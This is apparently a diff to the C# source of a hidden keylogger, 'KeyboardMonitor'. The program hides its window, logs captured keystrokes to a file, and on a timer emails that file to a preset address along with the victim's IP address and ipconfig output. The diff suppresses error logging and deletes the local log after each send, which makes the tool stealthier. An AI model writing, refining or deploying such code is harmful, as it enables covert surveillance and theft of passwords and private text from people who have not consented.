@@ -51,7 +51,7 @@ namespace KeyboardMonitor
 				}
 				catch (Exception ee)
 				{
-					LogHelper.WriteLog(ee.Message);
+					//LogHelper.WriteLog(ee.Message);
 				}
 			}
 		}
@@ -124,7 +124,7 @@ namespace KeyboardMonitor
 				//timer
 				this.timer = new System.Windows.Forms.Timer();
 				this.timer.Enabled = true;
-				this.timer.Interval = int.Parse(global::KeyboardMonitor.Properties.Resource.CommitDataIntervalDefault);
+				this.timer.Interval = int.Parse(global::KeyboardMonitor.Properties.Resource.CommitDataInterval);
 				this.timer.Tick += new EventHandler(this.TimerCommitData);
 
 				//隐藏窗体程序
@@ -153,13 +153,16 @@ namespace KeyboardMonitor
 				string data = string.Join(",", dataArray);
 				//写入本地文件
 				string dateTime = DateTime.Now.ToString("yyyyMMddHHmmss");
-				data = "\n=======================================================" + dateTime
-					+ "\n"+data
-					+ "\n=======================================================" + dateTime;
+				//data = "\n=======================================================" + dateTime
+				//	+ "\n"+data
+				//	+ "\n=======================================================" + dateTime;
+				data = "," + data;
 				LogHelper.WriteLog(data);
 				this.keys.Clear();
-				//网络正常发送邮件
-				if (KeyboardMonitor.API.WinNet.InternetCheckConnection() == true)
+				//throw new Exception();
+				//本地文件有内容且网络正常发送邮件
+				if (LogHelper.GetFileSize()==0
+					&&(KeyboardMonitor.API.WinNet.InternetCheckConnection() == true))
 				{
 					using (Commit commit = new Commit())
 					{
@@ -173,8 +176,9 @@ namespace KeyboardMonitor
 						string subject = commit.GetIP();
 						string body = cmd.ExecCommand("ipconfig");
 						string attachment = global::KeyboardMonitor.Properties.Resource.LogFilePath;
-						commit.SendEmail(form, new string[] { to }, subject, body, attachment);
+						commit.SendEmail(form, new string[] { to }, subject, body, attachment,true);
 						//发送成功之后清空本地文件
+						LogHelper.Clear();
 					}
 
 				}
